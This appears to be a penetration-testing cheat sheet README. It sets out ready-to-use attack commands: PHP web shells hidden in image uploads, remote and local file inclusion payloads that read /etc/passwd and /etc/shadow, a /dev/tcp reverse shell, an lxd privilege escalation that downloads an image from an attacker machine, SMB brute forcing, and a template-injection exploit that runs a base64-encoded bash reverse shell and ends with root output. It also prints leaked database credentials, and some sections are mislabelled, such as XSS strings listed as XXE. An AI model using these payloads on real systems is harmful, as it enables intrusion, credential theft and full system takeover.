
# Adding new topics daily
<img alt="GIF" src="https://media1.giphy.com/media/Rm1p7xp3Odl2o/giphy.gif?raw=true" width="500" height="320" />


# It may need some time to complete



----------------------------------------------------------------------------------------------------------
## Basic enumeration on linux and windows
| **Linux**  | **Windows** | **Purpose of command** |
|------------|-------------|------------------------|
|`whoami`|`whoami`|Name of current user
| `uname -a`|`ver`|Operating system
|`ifconfig`|`ipconfig /all`|Network configuration
|`netstat -an`|`netstat -an`|Network connections
|`ps -ef`|`tasklist`|Running processes

-----------------------------------------------------------------------------------------------------------
# Useful find commands example

`find SUID files`
```
find / -user root -perm /4000 2>/dev/null
```
```
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
```
```
find / -type f -name '*.txt' 2>/dev/null
```
```
find / -perm -u=s -type f 2>/dev/null
```
```
getcap -r / 2>/dev/null
```

`find and read all hidden flag.txt `
```
cat $(find / -name flag.txt 2>/dev/null)
```

-------------------------------------------------------------------------------------------------------------
# Bypass File Upload Filtering

`GIF89a`
```
GIF89a;
<?
system($_GET['cmd']);
?>
```

`exiftool`

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg
```

------------------------------------------------------------------------------------------------------------

# Remote File Inclusion (RFI)

#### Common payloads
`php:expect://id`

`php:expect://whoami`

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.

This is how they work.

So you have an unsanitized parameter, like this
```
$incfile = $_REQUEST["file"];
include($incfile.".php");
```
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.
```
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
```
And evil.txt will look like something like this:
```
<?php echo shell_exec("whoami");?>
```
`Or just get a reverse shell directly like this:`
```
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```
So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
Avoid extentions

Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.

If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.



-------------------------------------------------------------------------------------------------------------
# Local file inclusion (LFI) payloads

`../../../../../../etc/passwd`

`....//....//....//....//....//etc/passwd`

You can also try to use those insted of `/etc/passwd`
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/apache2/access.log
```

# LFI examples

*akech.com/index.php?token=`/etc/passwd%00`*

*akrech.com/index.php?page=`../../../../../../etc/passwd`*

```
http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
```
-------------------------------------------------------------------------------------------------------------
# PHP filters for LFI

```
php://filter/convert.base64-encode/resource=
```

```
php://filter/read=string.rot13/resource=
```

*example input:*

example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php

example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php

*example output:*

```
PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
```

*decode*
```
<?php
$db_name="bihtapub_db";
if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
   $con=mysql_connect("localhost","root","");
else
   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
if(!$con)...
.
.
?>

```

-------------------------------------------------------------------------------------------------------------


# XXE basic payloads

```
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
```
-------------------------------------------------------------------------------------------------------
# SQL injection payload list
`Generic SQL Injection Payloads`
```
'
''
' or "
-- or # 
' OR '1
' OR 1 -- -
'or 1=1 -- -
" OR "" = "
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
```

-------------------------------------------------------------------------------------------------------
# lxc/lxd Privilege Escalation

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
```
python -m SimpleHTTPServer
```

*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
```
cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
```

*import the lxc image*
```
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

*check the lxc image*
```
lxc image list
```

*run those commands on target machine*
```
lxc init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```
-------------------------------------------------------------------------------------------------
# Scecific permission for specific user
`no permission`
```
setfacl -m u:username:000 myfolder/myfile
```
`read-write-execute`
```
setfacl -m u:username:rwx myfolder/myfile
```
`readonly permission`
```
setfacl -m u:username:r myfolder/myfile
```
`read & write permission`
```
setfacl -m u:username:rw myfolder/myfile
```

--------------------------------------------------------------------------------------------------
# SMB enumeration
## smbclient usage
List shares on a machine using NULL Session
```
smbclient -L
```
List shares on a machine using a valid username + password
```
smbclient -L <target-IP> -U username%password
```
Connect to a valid share with username + password
```
smbclient //<target>/<share$> -U username%password
```
List files on a specific share
```
smbclient //<target>/<share$> -c 'ls' password -U username
```
List files on a specific share folder inside the share
```
smbclient //<target>/<share$> -c 'cd folder; ls' password -U username
```
Download a file from a specific share folder
```
smbclient //<target>/<share$> -c 'cd folder;get desired_file_name' password -U username
```
Copy a file to a specific share folder
```
smbclient //<target>/<share$> -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U username
```
Create a folder in a specific share folder
```
smbclient //<target>/<share$> -c 'mkdir .\target_folder\new_folder' password -U username
```
Rename a file in a specific share folder
```
smbclient //<target>/<share$> -c 'rename current_file.txt new_file.txt' password -U username
```

## enum4linux usage for smb enumeration
enum4linux - General enumeration - anonymous session
```
enum4linux -a <target>
```
enum4linux - General enumeration - authenticated session
```
enum4linux -a <target> -u <user> -p <pass>
```
enum4linux - Users enumeration
```
enum4linux -u <user> -p <pass> -U <target>
```
enum4linux - Group and members enumeration
```
enum4linux -u <user> -p <pass> -G <target>
```
enum4linux - Password policy
```
enum4linux -u <user> -p <pass> -P <target>
```
## Using nmap for smb enumeration
nmap - Enum Users
```
nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbpass=Pass@1234,smbdomain=workstation -p445 192.168.1.10
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbhash=aad3b435b51404eeaad3b435b51404ee:C318D62C8B3CA508DD753DDA8CC74028,smbdomain=mydomain -p445 192.168.1.10
```
nmap - Enum Groups
```
nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
nmap - Enum Shares
```
nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=LM:NTLM,smbdomain=domain
```
nmap - OS Discovery
```
nmap -p 445 --script smb-os-discovery <target>
```
nmap - SMB Vulnerabilities on Windows
```
nmap -p 445 --script smb-vuln-ms06-025 target-IP
nmap -p 445 --script smb-vuln-ms07-029 target-IP
nmap -p 445 --script smb-vuln-ms08-067 target-IP
nmap -p 445 --script smb-vuln-ms10-054 target-IP
nmap -p 445 --script smb-vuln-ms10-061 target-IP
nmap -p 445 --script smb-vuln-ms17-010 target-IP
```
Always check for updated list on https://nmap.org/nsedoc/scripts/
map - Brute Force Accounts (be aware of account lockout!)
```
nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
```

## Python RCE
* At first check if the app is build in Python.
* Try this, everywhere the app is taking input from the user.

```python
{{7*7}}
```
* if the app reflects the output as `49`.Then there might be a RCE possible.
* now encode the payload in basse64.

`input`
```shell
echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
```
`output`
```
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
```
* now start a listener
```
nc -lvvp 4444
```

```python
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
```
* if everything works currectly. You should get a reverse shell.
```shell
nc -vv -lnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.130.
Ncat: Connection from 10.10.11.130:54434.
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
